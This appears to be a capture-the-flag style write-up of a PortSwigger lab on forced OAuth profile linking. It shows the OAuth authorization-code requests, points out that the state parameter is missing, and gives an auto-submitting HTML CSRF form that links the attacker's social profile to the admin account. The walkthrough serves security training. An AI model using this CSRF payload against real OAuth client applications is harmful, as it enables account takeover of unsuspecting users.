# [Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

## Lab

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

## Analysis

attach a social profile (Authorization code grant type):

1. Authorization request:

    ```http
    GET /auth?client_id=ybc2oc0km6ocejcubd6zz&redirect_uri=https://0a19008504bf7fb7c08837b40022001d.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-0a5f00f4049a7f76c073352d02290008.web-security-academy.net
    ```

    the url does not contains `state`, the csrf token

2. user consent
3. authorization code grant:

    ```http
    GET /oauth-linking?code=xMdceRNTkIT6iStqFoj0EQ-uGHjE_zwz4ypI1_IASxt HTTP/1.1
    Host: 0a19008504bf7fb7c08837b40022001d.web-security-academy.net
    ```

## Solutions

start a `attach a social profile` process through burpsuite proxy, intercept the `authorization code grant` request, get the code and craft a csrf attack form:

  ```html
  <html>
      <body>
          <form action="https://0a19008504bf7fb7c08837b40022001d.web-security-academy.net/oauth-linking" method="GET">
    <input type="hidden" name="code" value="gng4O21bHskVFAyuXPihA3G4kz8jWC_WRbtMt1NLx7j" />
          </form>
          <script>
              document.forms[0].submit();
          </script>
      </body>
  </html>
  ```

login to admin account via attached social account and delete user `carlos` => solved
